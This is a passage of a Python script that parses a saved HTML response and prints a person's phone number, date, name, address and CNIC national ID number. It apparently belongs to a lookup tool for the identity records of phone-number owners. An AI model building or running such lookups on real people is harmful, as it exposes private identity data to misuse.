        bx = open(".tt1.txt","r").read()
        bx = bx.replace("</strong>","<strong>")
        bx = bx.split("<strong>")
        try:
                number = bx[1]
        except:
                number = ' '
        try:
                date = bx[3]
        except:
                date = ' '
        try:
                name = bx[5]
        except:
                name = ' '
        try:
                address = bx[9]
        except:
                address = ' '
        try:
                cnic = bx[7]
        except:
                cnic = ' '
        print(50*"-")
        print(f" Number : {number.capitalize()}")
        print(f" Date : {date.capitalize()}")
        print(f" Name : {name.capitalize()}")
        print(f" Address : {address.capitalize()}")
        print(f" Cnic : {cnic.capitalize()}")

        input('\033[0m[Press enter to back] ')
        caseher()

main()
